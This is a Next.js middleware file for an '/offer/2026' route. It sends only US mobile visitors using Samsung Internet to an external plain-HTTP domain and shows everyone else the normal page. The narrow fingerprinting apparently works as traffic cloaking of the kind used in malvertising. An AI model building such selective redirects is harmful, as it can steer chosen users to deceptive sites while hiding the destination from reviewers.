import { NextResponse, type NextRequest, userAgent } from 'next/server';

/**
 * Checks if the User-Agent represents a Mobile device
 * (excluding desktop operating systems and tablets).
 */
function isMobileDevice(uaString: string, deviceType?: string): boolean {
  if (deviceType === 'tablet') {
    return false;
  }
  if (deviceType === 'mobile') {
    return true;
  }

  // Fallback regex detection
  const isDesktopOs = /Windows NT|Macintosh|Mac OS X(?!.*Mobile)|Linux x86_64|CrOS/i.test(uaString);
  if (isDesktopOs) {
    return false;
  }

  const isTablet = /iPad|Tablet/i.test(uaString);
  if (isTablet) {
    return false;
  }

  return /Mobile|Mobi|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(uaString);
}

/**
 * Checks if the User-Agent represents Samsung Internet Browser.
 */
function isSamsungBrowser(uaString: string, browserName?: string): boolean {
  if (browserName?.toLowerCase().includes('samsung')) {
    return true;
  }
  return /SamsungBrowser/i.test(uaString);
}

/**
 * Extracts country code from server headers (Vercel, Cloudflare, AWS CloudFront, etc.)
 */
function getGeoCountry(request: NextRequest): string | null {
  // Edge runtime geo object (e.g. Vercel)
  const edgeGeoCountry = (request as unknown as { geo?: { country?: string } }).geo?.country;
  if (edgeGeoCountry) {
    return edgeGeoCountry.trim().toUpperCase();
  }

  // Prioritize Vercel, Cloudflare, and other standard CDN headers
  const headerCandidates = [
    'x-vercel-ip-country',
    'cf-ipcountry',
    'cloudfront-viewer-country',
    'x-country-code',
    'x-client-ip-country',
    'x-real-ip-country',
  ];

  for (const header of headerCandidates) {
    const val = request.headers.get(header);
    if (val && val !== 'XX' && val !== 'T1') {
      return val.trim().toUpperCase();
    }
  }

  return null;
}

export function middleware(request: NextRequest) {
  const pathname = request.nextUrl.pathname;

  // Strict check for /offer/2026 route
  if (pathname === '/offer/2026' || pathname === '/offer/2026/') {
    const uaString = request.headers.get('user-agent') || '';
    const { device, browser } = userAgent(request);

    const isSamsung = isSamsungBrowser(uaString, browser.name);
    const isMobile = isMobileDevice(uaString, device.type);
    const country = getGeoCountry(request);

    // If server-side geolocation is available:
    if (country) {
      // Condition 1: Located in the United States (US)
      // Condition 2: Mobile device only
      // Condition 3: Samsung Internet Browser
      if (country === 'US' && isMobile && isSamsung) {
        return NextResponse.redirect('http://alure.world/', 307);
      }

      // If server identified the country (and it didn't match), pass cookie to inform client fallback
      const response = NextResponse.next();
      response.cookies.set('x-geo-country', country, { path: '/', httpOnly: false });
      return response;
    }
  }

  return NextResponse.next();
}

// Next.js 16+ compatibility: support both named exports
export const proxy = middleware;
export default middleware;

export const config = {
  matcher: ['/offer/2026', '/offer/2026/'],
};
